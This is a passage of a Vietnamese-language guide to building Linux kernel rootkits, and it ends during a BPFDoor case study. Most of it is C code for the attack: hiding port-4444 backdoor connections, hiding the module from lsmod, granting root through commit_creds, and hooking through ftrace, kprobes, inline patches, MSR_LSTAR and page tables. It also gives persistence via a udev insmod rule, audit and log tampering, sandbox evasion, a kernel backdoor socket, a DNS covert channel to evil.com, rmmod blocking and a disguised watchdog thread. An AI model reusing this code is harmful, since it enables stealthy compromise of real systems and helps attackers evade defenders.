// kernel/net/ipv4/tcp_ipv4.c → tcp4_seq_show()
// Mỗi dòng output là một connection

// Hook seq_operations.show của tcp4_seq_ops
static int (*orig_tcp4_seq_show)(struct seq_file *, void *);

static int hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    if (v == SEQ_START_TOKEN)
        return orig_tcp4_seq_show(seq, v);

    struct sock *sk = v;
    // Ẩn connection trên port 4444 (ví dụ backdoor port)
    if (sk->sk_num == htons(4444) || sk->sk_dport == htons(4444))
        return 0;  // Skip — không output dòng này

    return orig_tcp4_seq_show(seq, v);
}

// === Method 2: Netfilter hooks ===
// Intercept packets tại kernel network stack

#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>

static unsigned int nf_hook_func(void *priv,
                                  struct sk_buff *skb,
                                  const struct nf_hook_state *state)
{
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;

    if (!skb) return NF_ACCEPT;

    ip_header = ip_hdr(skb);
    if (ip_header->protocol != IPPROTO_TCP) return NF_ACCEPT;

    tcp_header = tcp_hdr(skb);

    // Drop RST packets → connection không bị reset
    // Ẩn traffic từ C2 server
    if (ntohs(tcp_header->dest) == 4444) {
        // Xử lý packet (C2 command)
        return NF_STOLEN;  // Kernel quên packet này → invisible
    }

    // Knock sequence detection
    // Port knocking: nhận sequence SYN packets → activate backdoor
    return NF_ACCEPT;
}

static struct nf_hook_ops nf_ops = {
    .hook     = nf_hook_func,
    .pf       = PF_INET,
    .hooknum  = NF_INET_PRE_ROUTING,
    .priority = NF_IP_PRI_FIRST,
};

// Register: nf_register_net_hook(&init_net, &nf_ops);
// Unregister: nf_unregister_net_hook(&init_net, &nf_ops);
```

### 4.6 Module Hiding

```c
// === Ẩn LKM khỏi lsmod, /proc/modules, /sys/module ===

static struct list_head *module_prev;  // Save để restore khi cleanup

static void hide_module(void)
{
    // 1. Xóa khỏi module list → lsmod không thấy
    module_prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

    // 2. Xóa khỏi /sys/module → ls /sys/module không thấy
    kobject_del(&THIS_MODULE->mkobj.kobj);

    // 3. Xóa khỏi /proc/modules
    // (đã handled bởi list_del ở trên, vì proc/modules đọc module list)
}

static void show_module(void)
{
    // Restore module vào list (để có thể rmmod)
    list_add(&THIS_MODULE->list, module_prev);
}

// Vấn đề: sau khi hide, rmmod không tìm thấy module
// Giải pháp: dùng magic signal/proc write để show lại trước khi rmmod
```

### 4.7 Privilege Escalation — Give Root

```c
// === Method 1: Modify cred struct ===
static void give_root(void)
{
    struct cred *new_cred = prepare_creds();
    if (!new_cred) return;

    new_cred->uid.val  = new_cred->gid.val  = 0;
    new_cred->euid.val = new_cred->egid.val = 0;
    new_cred->suid.val = new_cred->sgid.val = 0;
    new_cred->fsuid.val = new_cred->fsgid.val = 0;

    // Cấp all capabilities
    new_cred->cap_inheritable = CAP_FULL_SET;
    new_cred->cap_permitted   = CAP_FULL_SET;
    new_cred->cap_effective   = CAP_FULL_SET;
    new_cred->cap_bset        = CAP_FULL_SET;
    new_cred->cap_ambient     = CAP_FULL_SET;

    commit_creds(new_cred);
}

// Trigger: kill -64 PID, echo "gimme" > /proc/backdoor, ioctl magic, etc.

// === Method 2: Trực tiếp patch init_cred ===
// Nguy hiểm hơn, nhưng simpler cho PoC
// commit_creds(prepare_kernel_cred(NULL));  
// prepare_kernel_cred(NULL) → create cred giống init (root + all caps)
```

---

## Phần 5: Kỹ thuật nâng cao

### 5.1 Ftrace-based Hooking (Modern, kernel 3.x+)

Ftrace là kernel tracing framework — rootkit lạm dụng nó để hook function mà **không cần sửa syscall table**. Đây là kỹ thuật phổ biến nhất trên kernel hiện đại.

```c
#include <linux/ftrace.h>
#include <linux/kallsyms.h>

// === Ftrace hook framework ===

struct ftrace_hook {
    const char *name;           // Tên function cần hook
    void *function;             // Hook function
    void *original;             // Con trỏ tới original function
    unsigned long address;      // Address của target
    struct ftrace_ops ops;
};

// Callback được ftrace gọi mỗi khi target function execute
static void notrace ftrace_thunk(unsigned long ip,
                                  unsigned long parent_ip,
                                  struct ftrace_ops *ops,
                                  struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook =
        container_of(ops, struct ftrace_hook, ops);

    // Redirect execution sang hook function
    // Thay đổi instruction pointer trong regs
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}

static int install_hook(struct ftrace_hook *hook)
{
    int err;

    // Tìm address của target function
    hook->address = lookup_name(hook->name);
    if (!hook->address) return -ENOENT;

    // Save original function pointer
    *((unsigned long *)hook->original) = hook->address;

    // Setup ftrace_ops
    hook->ops.func = ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_RECURSION
                    | FTRACE_OPS_FL_IPMODIFY;

    // Register
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) return err;

    err = register_ftrace_function(&hook->ops);
    if (err) {
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }
    return 0;
}

static void remove_hook(struct ftrace_hook *hook)
{
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
}

// === Sử dụng ===
static asmlinkage long (*orig_sys_kill)(const struct pt_regs *);

static asmlinkage long hooked_sys_kill(const struct pt_regs *regs)
{
    // Hook logic ở đây
    return orig_sys_kill(regs);
}

static struct ftrace_hook hooks[] = {
    { .name = "__x64_sys_kill",
      .function = hooked_sys_kill,
      .original = &orig_sys_kill },
};
```

**Ưu điểm ftrace hooking:**
- Không cần tìm/sửa sys_call_table
- Không cần disable CR0.WP
- Hoạt động trên kernel mới có CFI
- Kernel tự handle concurrency

**Nhược điểm:**
- Ftrace có thể bị monitor (ai đang dùng ftrace?)
- `available_filter_functions` expose hook targets
- Một số kernel config disable ftrace

### 5.2 Kprobe/Kretprobe Hooking

```c
#include <linux/kprobes.h>

// Kprobe: chèn breakpoint tại bất kỳ instruction nào trong kernel
// Kretprobe: hook tại return của function

// === Hook sys_execve bằng kprobe ===
static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    // regs->di = filename (arg1 của execve)
    char __user *filename = (char __user *)regs->di;
    char buf[256];

    if (strncpy_from_user(buf, filename, sizeof(buf)) > 0)
        pr_info("execve: %s\n", buf);  // Log mọi execution

    return 0;  // 0 = tiếp tục execution bình thường
}

static struct kprobe kp = {
    .symbol_name = "__x64_sys_execve",
    .pre_handler = handler_pre,
};

// Register: register_kprobe(&kp);
// Unregister: unregister_kprobe(&kp);

// === Kretprobe — Hook return value ===
static int ret_handler(struct kretprobe_instance *ri,
                        struct pt_regs *regs)
{
    long retval = regs_return_value(regs);

    // Modify return value
    // Ví dụ: sys_getdents64 return count → giảm count = ẩn entries
    if (should_filter)
        regs->ax = modified_retval;

    return 0;
}

static struct kretprobe krp = {
    .handler = ret_handler,
    .kp.symbol_name = "__x64_sys_getdents64",
    .maxactive = 20,
};
```

### 5.3 eBPF Rootkit — Thế hệ mới

eBPF (extended Berkeley Packet Filter) là công nghệ cho phép chạy sandboxed code trong kernel **mà không cần LKM**. Đây là vector attack mới và cực kỳ khó detect.

```
Tại sao eBPF rootkit đáng sợ:
┌─────────────────────────────────────────────────┐
│ 1. Không cần root để load (tùy config)          │
│ 2. Không xuất hiện trong lsmod                   │
│ 3. Được kernel "bảo vệ" — verifier ensure safety│
│ 4. Có thể hook hầu hết mọi function             │
│ 5. Khó phân biệt legitimate monitoring vs rootkit│
│ 6. Persist qua bpf filesystem pin                │
│ 7. Tooling phong phú (bpftrace, libbpf, bcc)    │
└─────────────────────────────────────────────────┘
```

**eBPF attack surface:**
```c
// === tracepoint hook ===
// Hook vào kernel tracepoint (syscall entry/exit, scheduler, etc.)
SEC("tp/syscalls/sys_exit_read")
int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Modify data sau khi read() return
    // → Fake nội dung file cho userspace
    return 0;
}

// === kprobe trong eBPF ===
SEC("kprobe/__x64_sys_getdents64")
int BPF_KPROBE(hook_getdents64) {
    // Log hoặc modify arguments
    return 0;
}

// === XDP (eXpress Data Path) ===
// Hook tại earliest point of packet processing
SEC("xdp")
int xdp_filter(struct xdp_md *ctx) {
    // Ẩn hoặc modify network traffic
    // Trước cả netfilter, trước cả tc
    return XDP_PASS;  // hoặc XDP_DROP, XDP_TX
}

// === Capabilities eBPF rootkit có thể có ===
// - Process hiding (override /proc reads)
// - File content tampering (modify read buffers)
// - Network hiding (XDP/TC level)
// - Keylogging (hook keyboard input)
// - Credential theft (hook authentication functions)
// - Backdoor trigger (watch for magic packets)
```

**Projects/Research về eBPF rootkit:**
- **TripleCross** — Full eBPF rootkit (academic research) — có paper
- **ebpfkit** — Red team eBPF toolkit
- **bad-bpf** — Collection of eBPF attack PoCs
- **pamspy** — Steal credentials via eBPF tracing PAM

### 5.4 Inline Hooking / Live Patching

```c
// Thay vì hook function pointer, patch function prologue trực tiếp
// Ghi đè bytes đầu tiên của function bằng JMP tới hook

// Original function:
// 0xffffffff81234567: push rbp          (55)
//                     mov rbp, rsp      (48 89 e5)
//                     sub rsp, 0x20     (48 83 ec 20)

// After hook:
// 0xffffffff81234567: mov rax, hook_addr (48 b8 xx xx xx xx xx xx xx xx)
//                     jmp rax            (ff e0)
// → tổng 12 bytes overwrite

static void inline_hook(void *target, void *hook, void *trampoline)
{
    unsigned char jmp_code[12] = {
        0x48, 0xb8,                         // mov rax, imm64
        0x00, 0x00, 0x00, 0x00,             // lower 4 bytes
        0x00, 0x00, 0x00, 0x00,             // upper 4 bytes
        0xff, 0xe0                          // jmp rax
    };

    // Set target address trong jmp_code
    *(unsigned long *)(jmp_code + 2) = (unsigned long)hook;

    // Save original bytes vào trampoline (để gọi original function)
    memcpy(trampoline, target, 12);
    // Append jump back to target+12
    unsigned char jmp_back[12];
    *(unsigned long *)(jmp_back + 2) = (unsigned long)(target + 12);
    jmp_back[0] = 0x48; jmp_back[1] = 0xb8;
    jmp_back[10] = 0xff; jmp_back[11] = 0xe0;
    memcpy(trampoline + 12, jmp_back, 12);

    // Overwrite target prologue
    // Cần: text_poke() hoặc disable WP + stop other CPUs
    disable_write_protection();
    memcpy(target, jmp_code, 12);
    enable_write_protection();
}

// Hiện đại hơn: dùng text_poke_bp() — kernel API cho live patching
// An toàn hơn, handle SMP correctly
```

### 5.5 DKOM (Direct Kernel Object Manipulation)

```
DKOM = Trực tiếp sửa kernel data structures mà không hook bất kỳ function nào

Ưu điểm:
  - Không thay đổi code → integrity check (AIDE, OSSEC) không phát hiện
  - Không để lại hook footprint
  - Nhanh, đơn giản

Nhược điểm:
  - Phải biết chính xác struct layout (kernel version dependent)
  - Race conditions nếu không lock đúng
  - Có thể gây crash nếu struct thay đổi giữa kernel versions
```

```c
// === Ẩn process (đã demo) ===
list_del_init(&task->tasks);

// === Ẩn network connection ===
// /proc/net/tcp đọc từ established hash table
// Xóa sock khỏi hash table → connection invisible
// Nhưng connection vẫn hoạt động vì data path không dùng hash table

// === Ẩn file bằng dentry manipulation ===
// Unhash dentry → lookup sẽ tạo negative dentry → "file not found"
// d_drop(dentry);  // Xóa khỏi dcache hash table

// === Modify timestamps ===
struct inode *inode = file_inode(filp);
struct timespec64 ts = { .tv_sec = desired_time, .tv_nsec = 0 };
inode->i_atime = inode->i_mtime = inode->i_ctime = ts;
```

### 5.6 Interrupt Descriptor Table (IDT) Hooking

```c
// IDT chứa handlers cho interrupts và exceptions
// Hook IDT entry → intercept trước cả syscall path

struct idt_entry {
    u16 offset_low;
    u16 segment;
    u8  ist;
    u8  type_attr;
    u16 offset_mid;
    u32 offset_high;
    u32 reserved;
} __packed;

// Đọc IDT base:
struct desc_ptr idtr;
asm volatile("sidt %0" : "=m"(idtr));
struct idt_entry *idt = (struct idt_entry *)idtr.address;

// Mỗi entry là một interrupt vector:
// idt[0]  = Divide error (#DE)
// idt[1]  = Debug (#DB)
// idt[3]  = Breakpoint (#BP) ← int3 handler
// idt[14] = Page Fault (#PF)
// idt[128] = Legacy syscall (int 0x80) — ít dùng trên x86-64

// Hook int3 handler → breakpoint-based hooking
// Đặt int3 (0xCC) tại đầu target function
// IDT handler redirect tới rootkit code
```

### 5.7 MSR Hooking

```c
// MSR_LSTAR (0xC0000082) = entry point cho SYSCALL instruction
// Thay đổi MSR_LSTAR → mọi syscall đi qua rootkit handler trước

unsigned long original_lstar;

static void hook_msr_lstar(void)
{
    rdmsrl(MSR_LSTAR, original_lstar);  // Save original

    // Set MSR_LSTAR tới rootkit entry
    wrmsrl(MSR_LSTAR, (unsigned long)rootkit_syscall_entry);

    // rootkit_syscall_entry phải:
    // 1. Thực hiện giống entry_SYSCALL_64 ban đầu
    // 2. Thêm rootkit logic
    // 3. Jump tới original handler
    // → Cực kỳ phức tạp, dễ crash
}

// Cần handle trên tất cả CPU cores (SMP):
// on_each_cpu(hook_on_cpu, NULL, 1);
// Mỗi CPU có MSR riêng!
```

### 5.8 Page Table Manipulation

```c
// Thay đổi page table entries để:
// 1. Remap physical memory — redirect read từ một page sang page khác
// 2. Ẩn memory regions
// 3. Execute-only memory (code nhưng không đọc được)

// Ví dụ: make kernel memory executable (bypass NX)
static int make_rw(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (!pte) return -EINVAL;

    // Set R/W bit
    pte->pte |= _PAGE_RW;
    return 0;
}

// EPT (Extended Page Table) manipulation — hypervisor level
// Nếu rootkit ở hypervisor, có thể thay đổi EPT entries
// → control physical memory mapping cho guest OS
// → ultimate stealth: guest OS không biết memory đã bị modified
```

---

## Phần 6: Anti-forensics & Persistence

### 6.1 Module Persistence

```
Các cách persist rootkit qua reboot:

┌──────────────────────────────────────────────────────────────────┐
│ 1. /etc/modules hoặc /etc/modules-load.d/                       │
│    → Thêm module name → auto-load khi boot                     │
│    → Dễ, nhưng dễ detect                                       │
├──────────────────────────────────────────────────────────────────┤
│ 2. Infect initramfs/initrd                                       │
│    → Chèn module vào initramfs → load trước filesystem mount     │
│    → Stealthier, nhưng cần rebuild initramfs                    │
├──────────────────────────────────────────────────────────────────┤
│ 3. Modify existing kernel module (.ko file)                      │
│    → Inject code vào module hợp lệ (vd: e1000.ko)              │
│    → Module signature sẽ fail nếu enforced                      │
├──────────────────────────────────────────────────────────────────┤
│ 4. DKMS (Dynamic Kernel Module Support)                          │
│    → Register rootkit qua DKMS → auto-rebuild khi kernel update │
├──────────────────────────────────────────────────────────────────┤
│ 5. udev rules                                                    │
│    → /etc/udev/rules.d/99-rootkit.rules                         │
│    → ACTION=="add", RUN+="/path/to/insmod rootkit.ko"           │
├──────────────────────────────────────────────────────────────────┤
│ 6. systemd service                                                │
│    → Service file load module on boot                           │
│    → Có thể ẩn service bằng rootkit sau khi load                │
├──────────────────────────────────────────────────────────────────┤
│ 7. Bootkit — modify boot chain (GRUB, UEFI)                     │
│    → Nation-state level                                         │
│    → Survive OS reinstall                                       │
│    → Cần kỹ thuật firmware-level                                │
└──────────────────────────────────────────────────────────────────┘
```

### 6.2 Log Evasion

```c
// === Tamper kernel ring buffer (dmesg) ===
// printk output nằm trong kernel log buffer
// Rootkit KHÔNG nên dùng printk cho production code

// Nếu cần xóa traces:
// 1. Hook syslog syscall → filter messages
// 2. Trực tiếp manipulate log_buf (risky, kernel version dependent)

// === Tamper audit subsystem ===
// auditd ghi log qua audit netlink socket
// Hook audit_log_start, audit_log_end → suppress audit events
// Hoặc: kill auditd daemon, disable audit rules

// === Timestamp manipulation ===
// Xóa file access time, modify ctime/mtime
// utimensat syscall hoặc trực tiếp modify inode

// === Hoạt động trong RAM only ===
// Tốt nhất: không chạm disk sau khi load
// Mọi data/config lưu trong kernel memory
// Reboot = sạch (trừ khi có persistence mechanism)
```

### 6.3 Anti-debugging & Anti-analysis

```c
// === Detect debugger/tracing ===

// 1. Kiểm tra kprobes đang active
// /sys/kernel/debug/kprobes/list — nếu có kprobe trên rootkit function → đang bị debug

// 2. Timing attacks
// rdtsc (Read Time-Stamp Counter) — đo thời gian execution
// Nếu function chạy chậm bất thường → có breakpoint/tracer
static inline unsigned long long rdtsc_start(void)
{
    unsigned int lo, hi;
    asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
    return ((unsigned long long)hi << 32) | lo;
}

// 3. Kiểm tra các security tool
// - Scan process list cho: rkhunter, chkrootkit, AIDE, osquery
// - Nếu phát hiện → thay đổi behavior (sandbox evasion)
// - Hoặc: kill tool, corrupt tool binary

// 4. Kiểm tra VM/Container
// - CPUID instruction → detect VMware, KVM, Xen
// - /sys/class/dmi/id/product_name → "VirtualBox", "VMware"
// - /.dockerenv existence → Docker container
// - /proc/1/cgroup → container cgroups
static bool is_vm(void)
{
    unsigned int eax, ebx, ecx, edx;
    __cpuid(1, eax, ebx, ecx, edx);
    return (ecx >> 31) & 1;  // Hypervisor present bit
}

// 5. Code integrity — detect nếu rootkit bị patch/analyzed
// CRC/hash check on own code sections
// Nếu mismatch → self-destruct
```

### 6.4 Covert Communication Channels

```c
// === C2 Communication Methods ===

// 1. Raw socket trong kernel
// Tạo kernel socket → communicate trực tiếp, bypass iptables rules

#include <linux/net.h>
#include <linux/in.h>
#include <net/sock.h>

static struct socket *sock;

static int create_backdoor_socket(void)
{
    struct sockaddr_in addr;
    int err;

    err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                            IPPROTO_TCP, &sock);
    if (err) return err;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);  // hoặc C2 IP

    err = kernel_bind(sock, (struct sockaddr *)&addr, sizeof(addr));
    // ... listen, accept, send/recv
    return 0;
}

// 2. ICMP covert channel
// Embed data trong ICMP echo request/reply payload
// → traffic looks like normal ping
// Hook netfilter → intercept/inject ICMP packets

// 3. DNS covert channel
// Encode data trong DNS queries (subdomains)
// data.encoded.evil.com → DNS server decode subdomain

// 4. TCP covert channel
// - Dùng TCP options field
// - Dùng sequence number encoding
// - Dùng urgency pointer
// - Timing-based (inter-packet delay encoding)

// 5. Passive trigger
// Không beacon → listen for magic packet
// Port knocking: SYN to ports 1234, 5678, 9012 in sequence → activate
// Magic payload: specific string trong packet data → trigger action
```

### 6.5 Rootkit Self-Protection

```c
// === Prevent removal ===

// 1. Block rmmod
// Hook delete_module syscall → return error
static asmlinkage long hooked_delete_module(const struct pt_regs *regs)
{
    char __user *name = (char __user *)regs->di;
    char module_name[MODULE_NAME_LEN];

    if (strncpy_from_user(module_name, name, MODULE_NAME_LEN) > 0) {
        if (strstr(module_name, "rootkit"))
            return -EBUSY;  // "Module is busy"
    }
    return orig_delete_module(regs);
}

// 2. Increment module refcount → không thể unload
// try_module_get(THIS_MODULE);  // Mỗi lần → refcount++
// Refcount > 0 → rmmod fails

// 3. Hide module (đã demo) — rmmod không tìm thấy

// 4. Watchdog thread
// Kernel thread kiểm tra rootkit integrity
// Nếu phát hiện hooks bị remove → reinstall
static int watchdog_fn(void *data)
{
    while (!kthread_should_stop()) {
        verify_hooks_intact();
        ssleep(5);  // Check mỗi 5 giây
    }
    return 0;
}
// kthread_run(watchdog_fn, NULL, "kworker/0:1");  // Tên disguised
```

---

## Phần 7: Rootkit thực tế đáng nghiên cứu

### 7.1 Open-source / Research Rootkits

| Rootkit | Level | Kỹ thuật chính | Link / Ghi chú |
|---------|-------|----------------|-----------------|
| **Diamorphine** | LKM | Syscall table hook, process/file hiding, give root via signal | GitHub — Starter rootkit, code sạch, dễ đọc. Bắt đầu từ đây. |
| **Reptile** | LKM | Syscall hook, module hiding, backdoor, port knocking, magic packet | GitHub — Feature-rich, có C2, persistence |
| **Sutekh** | LKM | Ftrace-based hooking | GitHub — Modern hooking technique demo |
| **Pinkit** | LKM | Kprobe-based hooking | GitHub — Minimal, focused |
| **TripleCross** | eBPF | eBPF-based rootkit, backdoor, C2, keylogger | GitHub + academic paper — State of the art eBPF |
| **ebpfkit** | eBPF | eBPF attack toolkit | GitHub — Red team focused |
| **bad-bpf** | eBPF | Collection of eBPF attacks | GitHub — Good learning resource |
| **Kovid** | LKM | Ftrace hooks, backdoor, hidden processes, persistence | GitHub — Active development, modern |
| **Nuk3Gh0st** | LKM | Syscall hooking, file/process hiding | GitHub — Educational |
| **Rootkit-dev** | LKM | Collection of techniques | GitHub — Well-documented examples |
| **KoviD** | LKM | Ftrace, hidden services, log tamper | GitHub — Good balance features/readability |
| **Cepheus** | LKM | Modern techniques, DKOM | GitHub — Clean code |
| **Brokepkg** | LKM | Minimal rootkit demo | GitHub — Absolute beginner friendly |

### 7.2 Lộ trình nghiên cứu rootkit source code

```
Tuần 1-2: Diamorphine
  ├── Đọc main.c line by line
  ├── Hiểu syscall table lookup
  ├── Hiểu getdents64 hook (file/process hiding)
  ├── Hiểu kill hook (magic signal → give root)
  ├── Hiểu module hiding
  └── Compile, test trong VM, debug bằng dmesg

Tuần 3-4: Reptile
  ├── So sánh approach với Diamorphine
  ├── Network hiding (port hiding, TCP connection hiding)
  ├── Backdoor mechanism (magic packet → reverse shell)
  ├── Persistence mechanism
  └── Shell backdoor

Tuần 5-6: Sutekh hoặc Kovid
  ├── Ftrace-based hooking (không sửa syscall table)
  ├── So sánh pros/cons vs syscall table hook
  ├── Cách handle SMP (multiple CPUs)
  └── Modern kernel compatibility

Tuần 7-8: TripleCross / ebpfkit
  ├── eBPF concepts (maps, programs, helpers)
  ├── Cách eBPF rootkit khác LKM rootkit
  ├── Detection challenges
  └── Attack surface analysis
```

### 7.3 Real-world Rootkits (Wild, Malware Analysis)

| Rootkit | Actor/Origin | Năm | Đặc điểm nổi bật | Phân tích |
|---------|-------------|------|-------------------|-----------|
| **Drovorub** | APT28 / GRU (Russia) | 2020 | LKM rootkit + userland agent, file/process hiding, C2 comms | NSA/FBI joint advisory — technical deep dive công khai |
| **Winnti** | APT41 / Winnti Group (China) | 2019+ | Kernel-level network traffic hiding, custom protocol | Multiple vendor reports |
| **Moriya** | TunnelSnake (suspected Chinese) | 2021 | Passive backdoor, WFP driver (Windows) + kernel component | Kaspersky report |
| **Caketap** | UNC2891 (suspected Chinese) | 2022 | Solaris SPARC rootkit, network/process hiding | Mandiant report |
| **FontOnLake** | Unknown | 2021 | LKM rootkit + trojanized utilities, SSH backdoor | ESET report |
| **Syslogk** | Unknown | 2022 | LKM rootkit, hides Rekoobe backdoor, magic packet trigger | Avast report |
| **BPFDoor** | Red Menshen (Chinese) | 2022 | BPF-based passive backdoor, cross-platform | PwC / Trend Micro reports |
| **Symbiote** | Unknown | 2022 | LD_PRELOAD + BPF rootkit (userland + kernel combo) | BlackBerry + Intezer report |
| **Lightning Framework** | Unknown | 2022 | Modular framework, rootkit component | Intezer report |
| **Orbit** | Unknown | 2022 | Userland rootkit (LD_PRELOAD), SSH credential stealing | Intezer report |
| **Mélofée** | Unknown (Chinese) | 2023 | LKM rootkit + implant, process/file hiding | ExaTrack report |
| **SprySOCKS** | Earth Lusca | 2023 | Linux backdoor với rootkit component | Trend Micro report |
| **GTPDOOR** | LightBasin/UNC1945 | 2024 | GTP-C protocol covert channel, telecom targeted | HaxRob research |
| **Pumakit** | Unknown | 2024 | LKM rootkit, ftrace hooking, unique syscall interaction | Elastic Security report |
| **sedexp** | Unknown | 2024 | udev rules persistence, minimal but effective | Aon/Stroz research |
| **PANIX** | Red team tool | 2024 | Collection of persistence mechanisms | Public tool |

### 7.4 Historic Rootkits (học lịch sử)

| Rootkit | Năm | Significance |
|---------|------|-------------|
| **SucKIT** | 2001 | Một trong những kernel rootkit đầu tiên, dùng /dev/kmem |
| **adore-ng** | 2004 | VFS-based hiding, influential design |
| **Knark** | 1999 | Early LKM rootkit, syscall table hook |
| **Phalanx/Phalanx2** | 2005-2008 | Dùng trong APT attacks thực tế |
| **Azazel** | 2014 | Userland rootkit (LD_PRELOAD), good educational value |
| **Jynx/Jynx2** | 2012 | LD_PRELOAD rootkit, popular in CTF |
| **Snakso** | 2012 | Kernel rootkit targeted Linux web servers |
| **Umbreon** | 2016 | ARM + x86 rootkit, targeted IoT |

---

## Phần 8: APT và rootkit — Học từ thực chiến

### 8.1 APT Groups sử dụng Linux Rootkits

```
┌──────────────────────────────────────────────────────────────┐
│ APT28 (Fancy Bear / GRU Unit 26165) — Russia                │
│ ├── Drovorub: LKM rootkit + agent + C2                      │
│ ├── Kỹ thuật: syscall hooking, file/process hiding          │
│ ├── C2: WebSocket over TLS                                  │
│ └── Lessons: layered design (kernel+user), clean uninstall  │
├──────────────────────────────────────────────────────────────┤
│ APT41 / Winnti Group — China                                │
│ ├── Winnti Linux variant: kernel-level traffic hiding       │
│ ├── Custom protocol, port reuse                             │
│ ├── Persistence: modified system services                   │
│ └── Lessons: stealth networking, protocol mimicry           │
├──────────────────────────────────────────────────────────────┤
│ Equation Group (suspected NSA TAO) — USA                    │
│ ├── YOURPRESIDENT: firmware rootkit concepts                │
│ ├── DoubleFeature: logging/diagnostic framework             │
│ ├── Kỹ thuật: firmware persistence, HDD firmware           │
│ └── Lessons: hardware-level persistence, extreme stealth    │
├──────────────────────────────────────────────────────────────┤
│ Turla (Snake/Uroburos) — Russia (FSB)                       │
│ ├── Penguin Turla: Linux variant, passive backdoor          │
│ ├── Snake: complex multi-platform framework                 │
│ ├── Kỹ thuật: covert channels, P2P C2, encrypted comms     │
│ └── Lessons: operational security, long-term persistence    │
├──────────────────────────────────────────────────────────────┤
│ Lazarus Group — North Korea                                  │
│ ├── Các variant Linux implant targeting financial sector    │
│ ├── Kỹ thuật: encrypted payloads, anti-forensics           │
│ └── Lessons: target-specific design, financial motivation   │
├──────────────────────────────────────────────────────────────┤
│ LightBasin / UNC1945 — China (suspected)                    │
│ ├── GTPDOOR: GTP protocol covert channel                   │
│ ├── Target: telecom infrastructure                          │
│ ├── Kỹ thuật: protocol-aware backdoor, SIM farm abuse      │
│ └── Lessons: industry-specific protocol abuse               │
├──────────────────────────────────────────────────────────────┤
│ Earth Lusca — China                                          │
│ ├── SprySOCKS: Linux backdoor + rootkit component           │
│ ├── Kỹ thuật: SOCKS proxy, encrypted C2                    │
│ └── Lessons: proxy chaining, infrastructure hiding          │
└──────────────────────────────────────────────────────────────┘
```

### 8.2 Patterns từ APT rootkit design

**Những gì APT làm mà script kiddies không:**

```
1. OPERATIONAL SECURITY
   ├── Không dùng printk/logging
   ├── Encrypt mọi string trong binary
   ├── Config encrypted, key derive từ environment (hostname, MAC)
   ├── Self-destruct nếu detect analysis environment
   └── Clean uninstall — xóa mọi trace

2. MODULAR ARCHITECTURE  
   ├── Core module: chỉ hiding + persistence
   ├── Plugin modules: loaded on demand
   │   ├── Keylogger plugin
   │   ├── Network sniffer plugin
   │   ├── Credential harvester plugin
   │   └── Data exfil plugin
   ├── Userland companion: chịu trách nhiệm complex operations
   └── Communication protocol between kernel ↔ userland

3. COVERT COMMUNICATION
   ├── Passive-first: không beacon, đợi trigger
   ├── Protocol mimicry: traffic giống legitimate
   ├── Domain fronting / CDN abuse
   ├── DNS over HTTPS cho C2 resolution
   ├── Steganography trong image/file uploads
   └── Timing-based channels

4. PERSISTENCE LAYERS
   ├── Primary: LKM / eBPF program
   ├── Backup: modified system binary / shared library
   ├── Emergency: crontab / systemd / init script
   └── Firmware (nếu target justifies cost)

5. ANTI-ANALYSIS
   ├── VM detection (nhưng subtle — không crash, chỉ change behavior)
   ├── Debugger detection
   ├── Timing checks
   ├── Integrity verification of own code
   └── Decoy functionality (fake benign purpose)
```

### 8.3 Case Study: Drovorub Deep Dive

```
Drovorub Architecture (APT28):
 
┌─────────────────────────────────────────────────┐
│                  C2 Server                       │
│  (WebSocket/TLS, JSON protocol, certificate auth)│
└────────────────────┬────────────────────────────┘
                     │ TLS/WebSocket
                     ▼
┌─────────────────────────────────────────────────┐
│              Drovorub-agent (userland)            │
│  - File transfer (upload/download)               │
│  - Port forwarding                               │
│  - Remote shell                                  │
│  - Communicate with kernel module via ioctl       │
│  - Auto-restart if killed                        │
└────────────────────┬────────────────────────────┘
                     │ ioctl / netlink
                     ▼
┌─────────────────────────────────────────────────┐
│           Drovorub-kernel (LKM rootkit)           │
│  - Hook: getdents/getdents64 (hide files)        │
│  - Hook: read (filter /proc/modules content)     │
│  - Hide: rootkit files, agent process, network   │
│  - Hide: itself from lsmod                       │
│  - Protect: agent process from being killed      │
│  - Netfilter hook: hide C2 traffic               │
└─────────────────────────────────────────────────┘

Key Technical Details:
  - Module hiding: list_del from modules list
  - File hiding: getdents64 hook + filename filter  
  - Process hiding: /proc readdir hook
  - Network hiding: Netfilter hook drop visibility
  - Communication: Custom ioctl between agent ↔ kernel
  - Persistence: standard insmod + modified startup scripts
  - Detection: NSA recommended YARA rules + module signature enforcement

Bài học:
  1. Kernel module ĐƠN GIẢN — chỉ hiding & protection
  2. Complex logic ở USERLAND — easier to develop/debug
  3. Communication channel ENCRYPTED — certificate-based auth
  4. NO hardcoded C2 — configurable, multiple fallbacks
  5. CLEAN separation of concerns
```

### 8.4 Case Study: BPFDoor

```
BPFDoor (Red Menshen):

Tại sao quan trọng:
  - Passive backdoor — KHÔNG beacon ra ngoài
  - Dùng BPF (cBPF, không phải eBPF) cho packet filtering
  - Trước cả firewall — attach ở raw socket level
  - Cross-platform: Linux + Solaris
  - Đã active 5+ năm trước khi bị phát hiện

Hoạt động:
  1. Attacker gửi magic packet (ICMP/UDP/TCP) với password
  2. BPF filter ở kernel level nhận diện magic packet
  3. Packet KHÔNG đi vào normal network stack
  4. Backdoor activate: bind reverse/bind shell
